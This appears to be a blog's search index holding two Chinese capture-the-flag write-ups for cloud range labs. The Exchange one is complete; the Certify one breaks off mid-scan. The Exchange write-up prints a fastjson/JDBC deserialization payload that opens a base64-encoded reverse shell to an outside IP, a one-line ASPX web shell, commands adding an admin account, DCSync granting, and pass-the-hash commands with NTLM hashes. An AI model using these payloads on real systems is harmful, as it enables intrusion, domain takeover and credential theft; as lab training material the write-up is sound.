<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>春秋云镜 Exchange writeup</title>
    <link href="/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/"/>
    <url>/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜-Exchange-writeup"><a href="#春秋云镜-Exchange-writeup" class="headerlink" title="春秋云镜 Exchange writeup"></a>春秋云镜 Exchange writeup</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫ip</p><div class="code-wrapper"><pre><code class="hljs awk">D:\CTF-tool\network\fscan1.<span class="hljs-number">8.2</span>&gt;fscan64 -h <span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ <span class="hljs-regexp">/ /</span>_\<span class="hljs-regexp">/____/</span> __|<span class="hljs-regexp">/ __| &#x27;__/</span> _` |<span class="hljs-regexp">/ __| |/</span> /<span class="hljs-regexp">/ /</span>_\\_____\__ \ (__| | | (_| | (__|   &lt;\____<span class="hljs-regexp">/     |___/</span>\___|_|  \__,_|\___|_|\_\                     fscan version: <span class="hljs-number">1.8</span>.<span class="hljs-number">2</span>start infoscan(icmp) Target <span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>  is alive[*] Icmp alive hosts len is: <span class="hljs-number">1</span><span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>:<span class="hljs-number">22</span> open<span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>:<span class="hljs-number">80</span> open<span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>:<span class="hljs-number">8000</span> open[*] alive ports len is: <span class="hljs-number">3</span>start vulscan[*] WebTitle: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>     code:<span class="hljs-number">200</span> len:<span class="hljs-number">19813</span>  title:lumia[*] WebTitle: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>:<span class="hljs-number">8000</span> code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>:<span class="hljs-number">8000</span>/login.html[*] WebTitle: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">163.148</span>:<span class="hljs-number">8000</span>/login.html code:<span class="hljs-number">200</span> len:<span class="hljs-number">5662</span>   title:Lumia ERP已完成 <span class="hljs-number">3</span>/<span class="hljs-number">3</span>[*] 扫描结束,耗时: <span class="hljs-number">1</span>m18.<span class="hljs-number">223253</span>s</code></pre></div><p>华夏erp，v2.3</p><p>未授权信息泄露</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/user/g</span>etAllList;.ico</code></pre></div><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;userList&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>            <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">63</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;季圣华&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;loginName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jsh&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;department&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;phonenum&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;ismanager&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;isystem&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;remark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;tenantId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">63</span>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>            <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">120</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;管理员&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;loginName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;department&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;phonenum&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;ismanager&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;isystem&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;remark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;tenantId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>            <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">131</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;测试用户&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;loginName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test123&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;department&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;phonenum&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;ismanager&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;isystem&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;remark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-attr">&quot;tenantId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">63</span>            <span class="hljs-punctuation">&#125;</span>        <span class="hljs-punctuation">]</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201224249577.png" alt="image-20241201224249577"></p><p>查文章 有fastjson + jdbc的攻击方式</p><p><a href="https://cn-sec.com/archives/1798444.html">华夏erp账号密码泄露+后台rce（最新组合漏洞) | CN-SEC 中文网</a></p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>, <span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;vps-ip&quot;</span>, <span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3308</span>, <span class="hljs-string">&quot;info&quot;</span>: &#123; <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;deser_CC31_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguODkuNjEuNzEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span>, <span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>, <span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span> &#125;&#125;&#125;</code></pre></div><p>起一个恶意的mysql服务</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/user/</span>list?search=&lt;urlencoded-payload&gt;</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201225312758.png" alt="image-20241201225312758"></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>看ip，扫内网，挂代理</p><div class="code-wrapper"><pre><code class="hljs accesslog">./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>/<span class="hljs-number">24</span>   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>start infoscan(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     is alive<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><span class="hljs-number">172.22.3.12:8000</span> open<span class="hljs-number">172.22.3.26:445</span> open<span class="hljs-number">172.22.3.9:445</span> open<span class="hljs-number">172.22.3.2:445</span> open<span class="hljs-number">172.22.3.9:443</span> open<span class="hljs-number">172.22.3.26:139</span> open<span class="hljs-number">172.22.3.9:139</span> open<span class="hljs-number">172.22.3.2:139</span> open<span class="hljs-number">172.22.3.26:135</span> open<span class="hljs-number">172.22.3.9:135</span> open<span class="hljs-number">172.22.3.2:135</span> open<span class="hljs-number">172.22.3.9:81</span> open<span class="hljs-number">172.22.3.9:80</span> open<span class="hljs-number">172.22.3.12:80</span> open<span class="hljs-number">172.22.3.12:22</span> open<span class="hljs-number">172.22.3.9:808</span> open<span class="hljs-number">172.22.3.2:88</span> open<span class="hljs-number">172.22.3.9:8172</span> open<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">18</span>start vulscan<span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>   <span class="hljs-string">[-&gt;]</span>XIAORANG-WIN16   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>   <span class="hljs-string">[-&gt;]</span>XIAORANG-PC   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>  (Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>   <span class="hljs-string">[-&gt;]</span>XIAORANG-EXC01   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      <span class="hljs-string">[+]</span>DC XIAORANG-WIN16.xiaorang.lab      Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span> <span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     XIAORANG\XIAORANG-PC           <span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">19813</span>  title:lumia<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>   code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      XIAORANG-EXC01.xiaorang.lab         Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span> <span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html code:<span class="hljs-number">200</span> len:<span class="hljs-number">5662</span>   title:Lumia ERP<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span>      code:<span class="hljs-number">403</span> len:<span class="hljs-number">1157</span>   title:<span class="hljs-number">403</span> - 禁止访问: 访问被拒绝。<span class="hljs-string">[*]</span> WebTitle: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span>   code:<span class="hljs-number">404</span> len:<span class="hljs-number">0</span>      title:None<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>         code:<span class="hljs-number">403</span> len:<span class="hljs-number">0</span>      title:None<span class="hljs-string">[*]</span> WebTitle: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>        code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/<span class="hljs-string">[*]</span> WebTitle: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/auth/logon.aspx?url=https%3a%2f%2f172.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>%2fowa%2f&amp;reason=<span class="hljs-number">0</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">28237</span>  title:Outlook已完成 <span class="hljs-number">18</span>/<span class="hljs-number">18</span><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">15</span>.636834931s</code></pre></div><div class="code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.3.12</span> # 本机<span class="hljs-number">172.22.3.2</span> # DC<span class="hljs-number">172.22.3.9</span> # XIAORANG-EXC01<span class="hljs-number">172.22.3.26</span> # XIAORANG\XIAORANG-PC</code></pre></div><p>看172.22.3.9 是个exchange服务</p><p>搜索发现漏洞<a href="https://saucer-man.com/information_security/748.html#cl-9">Exchange CVE-2021-26855 RCE漏洞复现 - yanq的个人博客 (saucer-man.com)</a></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201230734936.png" alt="image-20241201230734936"></p><p>开放3389，可以rdp</p><p>添加一个管理员用户</p><div class="code-wrapper"><pre><code class="hljs sql">net <span class="hljs-keyword">user</span> zeropeach whoami<span class="hljs-variable">@666</span> <span class="hljs-operator">/</span><span class="hljs-keyword">add</span>net localgroup administrators zeropeach <span class="hljs-operator">/</span><span class="hljs-keyword">add</span></code></pre></div><p>在Administrator.XIAORANG下找到flag</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201232735242.png" alt="image-20241201232735242"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201232622396.png" alt="image-20241201232622396"></p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>由于新建的用户不在域内，无法进行信息收集</p><p>在服务可访问的地方写马</p><div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\</code></pre></div><div class="code-wrapper"><pre><code class="hljs mel">&lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%eval(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;</code></pre></div><p>蚁剑连接的时候注意勾选这个</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241202010625064.png" alt="image-20241202010625064"></p><p>连上后就有system权限</p><p>信息收集一下</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201235059378.png" alt="image-20241201235059378"></p><p>XIAORANG-EXC01对于域内用户有WriteDACL权限</p><p>利用机器账户给自己一个dcsync权限</p><p>传mimikatz获取机器用户hash</p><div class="code-wrapper"><pre><code class="hljs ada">* Username : <span class="hljs-type">XIAORANG</span>-EXC01$* Domain   : <span class="hljs-type">XIAORANG</span>* NTLM     : 048<span class="hljs-type">fad9b840e4f71cfe5145cd728c534</span></code></pre></div><p>用bloodyAD赋予权限</p><div class="code-wrapper"><pre><code class="hljs stylus">bloodyAD -d xiaorang<span class="hljs-selector-class">.lab</span> -u <span class="hljs-string">&quot;XIAORANG-EXC01$&quot;</span> -<span class="hljs-selector-tag">p</span> :<span class="hljs-number">048</span>fad9b840e4f71cfe5145cd728c534 <span class="hljs-attr">--host</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.2</span> add dcsync XIAORANG-EXC01$</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201235911264.png" alt="image-20241201235911264"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241201235902206.png" alt="image-20241201235902206"></p><p>然后就pass the hash</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241202000127250.png" alt="image-20241202000127250"></p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>还有172.22.3.26这台机子</p><p>可以扫一下的，但是赶时间，直接看wp</p><p>说是横向过去，但是我横向不过去</p><p>最后是smbclient登录</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> smbclient.py -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@<span class="hljs-number">172.22.3.26</span></code></pre></div><p>在Lumia桌面有secret.zip</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241202012755251.png" alt="image-20241202012755251"></p><p>要密码，没啥用</p><p>看wp，说提示在 Lumia 的邮箱里面</p><p>可以用<a href="https://github.com/Jumbo-WJB/PTH_Exchange/tree/main">Jumbo-WJB&#x2F;PTH_Exchange: If you only have hash, you can still operate exchange (github.com)</a></p><p>上面可以知道Lumia的NTLM hash</p><p>下载Lumia的邮件</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">python pthexchange.py <span class="hljs-params">--target</span> https:<span class="hljs-string">//172.22.3.9/</span> <span class="hljs-params">--username</span> <span class="hljs-string">&quot;Lumia&quot;</span> <span class="hljs-params">--password</span> <span class="hljs-string">&quot;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&quot;</span> <span class="hljs-params">--action</span> Download</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241202003855146.png" alt="image-20241202003855146"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241202003835146.png" alt="image-20241202003835146"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241202003738121.png" alt="image-20241202003738121"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/image-20241202003807954.png" alt="image-20241202003807954"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>主要是对exchange不了解，outlook邮箱，还挺多漏洞的</p><p>Exchange 机器账户默认对域内成员具有 WriteDACL 权限，可以赋予DCSync权限</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜 Certify writeup</title>
    <link href="/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/"/>
    <url>/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜-Certify-writeup"><a href="#春秋云镜-Certify-writeup" class="headerlink" title="春秋云镜 Certify writeup"></a>春秋云镜 Certify writeup</h1><p>刚说完每日一刷就摆了一天。。。。</p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫ip</p><div class="code-wrapper"><pre><code class="hljs awk">   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ <span class="hljs-regexp">/ /</span>_\<span class="hljs-regexp">/____/</span> __|<span class="hljs-regexp">/ __| &#x27;__/</span> _` |<span class="hljs-regexp">/ __| |/</span> /<span class="hljs-regexp">/ /</span>_\\_____\__ \ (__| | | (_| | (__|   &lt;\____<span class="hljs-regexp">/     |___/</span>\___|_|  \__,_|\___|_|\_\                     fscan version: <span class="hljs-number">1.8</span>.<span class="hljs-number">2</span>start infoscan(icmp) Target <span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>   is alive[*] Icmp alive hosts len is: <span class="hljs-number">1</span><span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>:<span class="hljs-number">22</span> open<span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>:<span class="hljs-number">80</span> open<span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>:<span class="hljs-number">8983</span> open[*] alive ports len is: <span class="hljs-number">3</span>start vulscan[*] WebTitle: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">612</span>    title:Welcome to nginx![*] WebTitle: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>:<span class="hljs-number">8983</span> code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>[*] WebTitle: http:<span class="hljs-regexp">//</span><span class="hljs-number">39.101</span>.<span class="hljs-number">131.18</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">16555</span>  title:Solr Admin已完成 <span class="hljs-number">3</span>/<span class="hljs-number">3</span>[*] 扫描结束,耗时: <span class="hljs-number">1</span>m20.<span class="hljs-number">7121562</span>s</code></pre></div><p>solr可以发现jndi漏洞</p><p>反弹shell后找不到flag文件，猜测要提权</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201161609967.png" alt="image-20241201161609967"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201161618734.png" alt="image-20241201161618734"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201182354910.png" alt="image-20241201182354910"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201161835367.png" alt="image-20241201161835367"></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>看ip，挂代理，扫内网</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201162456035.png" alt="image-20241201162456035"></p><div class="code-wrapper"><pre><code class="hljs accesslog">./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">1</span>/<span class="hljs-number">24</span>   ___                              _      / _ \     